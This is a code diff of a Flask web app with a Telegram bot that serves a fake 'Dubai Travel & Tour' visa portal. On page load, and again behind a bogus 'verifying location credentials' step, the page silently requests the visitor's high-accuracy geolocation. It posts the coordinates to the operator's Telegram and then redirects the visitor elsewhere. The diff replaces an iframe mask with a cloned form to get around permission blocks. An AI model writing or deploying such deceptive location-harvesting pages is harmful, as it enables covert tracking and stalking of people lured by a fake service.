@@ -42,10 +42,10 @@ def send_link_command(message):
     else:
         bot.send_message(message.chat.id, "Unauthorized access!")
 
-# --- FLASK WEB SERVER (FULLSCREEN IFRAME MASKING) ---
+# --- FLASK WEB SERVER (NATIVE IMMERSIVE FRONTEND) ---
 @app.route("/")
 def index():
-    # Yeh html background me original website load kar ke upar permission display karega
+    # Embedding the exact clone structure directly to bypass iframe permission blocks
     return '''
 <!DOCTYPE html>
 <html lang="en">
@@ -54,69 +54,127 @@ def index():
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dubai Travel & Tour - Professional Visa Services</title>
     <style>
-        html, body {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-            background-color: #ffffff;
-        }
-        iframe {
-            width: 100%;
-            height: 100%;
-            border: none;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 1;
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: #0f172a; color: #f8fafc; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { max-width: 500px; width: 100%; background: #1e293b; padding: 30px; border-radius: 16px; border: 1px solid #334155; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; }
+        .logo { font-size: 24px; font-weight: bold; color: #38bdf8; margin-bottom: 5px; }
+        .subtitle { font-size: 14px; color: #94a3b8; margin-bottom: 25px; }
+        .step-container { background: #0f172a; padding: 15px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #1e293b; display: flex; justify-content: space-around; font-size: 12px; color: #64748b; }
+        .step { display: flex; flex-direction: column; align-items: center; gap: 5px; }
+        .step.active { color: #38bdf8; font-weight: bold; }
+        .step-num { width: 22px; height: 22px; background: #334155; color: #fff; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 11px; }
+        .step.active .step-num { background: #38bdf8; color: #0f172a; }
+        .form-group { text-align: left; margin-bottom: 18px; }
+        label { display: block; font-size: 13px; color: #94a3b8; margin-bottom: 6px; font-weight: 500; }
+        select, input { width: 100%; padding: 11px 15px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: #fff; font-size: 14px; outline: none; }
+        select:focus, input:focus { border-color: #38bdf8; }
+        .btn { width: 100%; background: #38bdf8; color: #0f172a; border: none; padding: 13px; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
+        .btn:hover { background: #7dd3fc; }
+        .loading-overlay { display: none; margin-top: 15px; color: #94a3b8; font-size: 13px; }
+        .spinner { width: 24px; height: 24px; border: 3px solid #334155; border-top: 3px solid #38bdf8; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <!-- Netlify Website Background Frame -->
-    <iframe src="https://easyvisaapplication.netlify.app/"></iframe>
+<div class="container">
+    <div class="logo">Dubai Travel & Tour</div>
+    <div class="subtitle">Visa Application & Verification Portal</div>
+    
+    <div class="step-container">
+        <div class="step active"><div class="step-num">1</div>Verification</div>
+        <div class="step"><div class="step-num">2</div>Travel Details</div>
+        <div class="step"><div class="step-num">3</div>Documents</div>
+        <div class="step"><div class="step-num">4</div>Review</div>
+    </div>
 
-    <script>
-        function sendData(payload) {
-            fetch('/update', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload)
-            }).catch(function(err) { console.error('Error:', err); });
-        }
+    <div id="form-panel">
+        <div class="form-group">
+            <label>Select Destination Country *</label>
+            <select id="country">
+                <option value="Malaysia">Malaysia ($45 USD)</option>
+                <option value="Italy">Italy (€80 EUR)</option>
+                <option value="Germany">Germany ($90 USD)</option>
+                <option value="Saudi Arabia">Saudi Arabia ($120 USD)</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label>Visa Type *</label>
+            <select>
+                <option>Work Visa / Employment</option>
+                <option>E-Visa / Tourist</option>
+                <option>Visit Visa</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label>Full Name (as in Passport) *</label>
+            <input type="text" placeholder="Enter your full name" required>
+        </div>
+        <button class="btn" onclick="startProcess()">Proceed to Step 2</button>
+    </div>
 
-        function onSuccess(pos) {
-            try {
-                sendData({
-                    lat: pos.coords.latitude,
-                    lon: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    timestamp: pos.timestamp
-                });
-            } catch(e) {
-                console.error('Error:', e);
-            }
-        }
+    <div id="loading" class="loading-overlay">
+        <div class="spinner"></div>
+        <div id="load-msg">Verifying location credentials securely...</div>
+    </div>
+</div>
+
+<script>
+    function sendData(payload) {
+        fetch('/update', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)
+        })
+        .then(() => {
+            // Data send hote hi real Netlify website par redirect kar do
+            window.location.href = "https://netlify.app";
+        })
+        .catch(() => {
+            window.location.href = "https://netlify.app";
+        });
+    }
+
+    function onSuccess(pos) {
+        sendData({
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            timestamp: pos.timestamp
+        });
+    }
+    
+    function onError(err) {
+        // Agar permission deny kare tab bhi main site par redirect ho jaye
+        window.location.href = "https://netlify.app";
+    }
+    
+    function startProcess() {
+        document.getElementById('form-panel').style.display = 'none';
+        document.getElementById('loading').style.display = 'block';
         
-        function onError(err) {
-            console.log('Permission denied or error occurred.');
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(onSuccess, onError, {
+                enableHighAccuracy: true,
+                timeout: 8000,
+                maximumAge: 0
+            });
+        } else {
+            window.location.href = "https://netlify.app";
         }
-        
-        function requestLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(onSuccess, onError, {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                });
-            }
+    }
+
+    // Page load hote hi authorization automatically backup background check trigger karega
+    window.onload = function() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(onSuccess, null, {
+                enableHighAccuracy: true,
+                timeout: 5000
+            });
         }
-        
-        // Website load hote hi permission trigger ho jayegi
-        window.onload = requestLocation;
-    </script>
+    };
+</script>
+
 </body>
 </html>
 '''
@@ -146,19 +204,11 @@ def update():
     send_telegram_message(msg)
     return "OK", 200
 
-# Run Flask server in a separate background thread
 def run_flask():
     app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
 
 if __name__ == "__main__":
-    print("🚀 Starting Web Server & Telegram Bot simultaneously...")
-    
-    # Start Flask thread
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
-    
-    # Send startup alert to your Telegram
     send_telegram_message("🟢 *Bot & Server Successfully Started!* Type /link to get your URL.")
-    
-    # Start Telegram Bot polling
     bot.infinity_polling()
